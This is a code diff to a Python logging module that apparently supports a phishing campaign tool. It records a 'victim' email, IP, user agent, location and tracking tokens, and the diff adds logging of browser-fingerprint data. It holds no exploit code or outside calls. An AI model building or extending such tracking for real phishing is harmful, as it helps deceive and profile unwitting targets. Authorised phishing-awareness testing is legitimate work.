@@ -9,9 +9,10 @@ from datetime import datetime, timezone
 _lock = threading.Lock()
 
 LOG_DIR = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "data", "logs"))
-CAPTURES_PATH = os.path.join(LOG_DIR, "captures.json")
-CLICKS_PATH = os.path.join(LOG_DIR, "clicks.json")
-CAMPAIGN_PATH = os.path.join(LOG_DIR, "campaign.json")
+CAPTURES_PATH     = os.path.join(LOG_DIR, "captures.json")
+CLICKS_PATH       = os.path.join(LOG_DIR, "clicks.json")
+CAMPAIGN_PATH     = os.path.join(LOG_DIR, "campaign.json")
+FINGERPRINTS_PATH = os.path.join(LOG_DIR, "fingerprints.json")
 
 
 def _append(path: str, entry: dict) -> None:
@@ -35,19 +36,31 @@ def log_capture(
     user_agent: str,
     track_token: str = "",
     geo: dict | None = None,
+    fp_token: str = "",
 ) -> str:
     victim_id = str(uuid.uuid4())
     entry = {
-        "timestamp": datetime.now(timezone.utc).isoformat(),
-        "email": email,
-        "ip": ip,
-        "user_agent": user_agent,
+        "timestamp":   datetime.now(timezone.utc).isoformat(),
+        "email":       email,
+        "ip":          ip,
+        "user_agent":  user_agent,
         "track_token": track_token or None,
-        "victim_id": victim_id,
-        "geo": geo or {},
+        "fp_token":    fp_token or None,
+        "victim_id":   victim_id,
+        "geo":         geo or {},
     }
     _append(CAPTURES_PATH, entry)
     return victim_id
+
+
+def log_fingerprint(data: dict, ip: str) -> None:
+    """Guarda dados de fingerprinting do browser da vítima."""
+    entry = {
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+        "ip":        ip,
+        **data,
+    }
+    _append(FINGERPRINTS_PATH, entry)
 
 
 def log_click(token: str, ip: str, user_agent: str) -> None:
